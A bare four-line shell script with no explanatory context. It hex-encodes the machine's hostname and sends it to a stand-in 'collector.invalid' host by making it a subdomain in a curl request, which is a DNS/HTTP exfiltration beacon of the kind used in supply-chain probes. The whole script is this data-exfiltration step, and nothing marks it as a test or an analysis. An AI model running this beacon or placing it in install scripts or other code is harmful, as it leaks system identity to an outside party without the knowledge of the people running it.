#!/bin/sh
identity=$(hostname |
    xxd -p)
curl "https://$identity.collector.invalid/"
